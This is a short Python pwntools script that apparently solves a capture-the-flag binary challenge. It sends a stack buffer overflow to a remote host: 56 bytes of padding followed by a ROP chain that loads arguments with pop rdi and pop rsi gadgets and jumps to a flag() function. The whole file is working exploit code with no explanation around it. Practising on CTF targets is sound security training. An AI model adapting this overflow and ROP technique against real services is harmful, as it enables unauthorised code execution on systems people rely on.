from pwn import *
from pwn import p64

POP_RDI = 0x4021f8
POP_RSI_R15 = 0x4021f6
FLAG_FN = 0x4019bc 
def solve():
    # context.binary = ELF('./flow3')
    # p = process()
    ip = "104.248.97.237"
    # p = remote("localhost", 2003)
    p = remote(ip, 1346)
    payload = b'A' * 56            # Padding
    payload += p64(POP_RDI)        # pop rdi; ret
    payload += p64(0xdeadc0de)     # value into rdi -> first param
    payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
    payload += p64(1337)     # value into rsi -> first param
    payload += p64(0x0)            # value into r15 -> not important
    payload += p64(FLAG_FN)       # Address of flag()
    payload += p64(0x0)
    # with open("input.txt", "wb") as f:
    #     f.write(payload)
    log.info(p.clean())
    p.sendline(payload)
    log.info(p.clean())
    p.close()

solve()
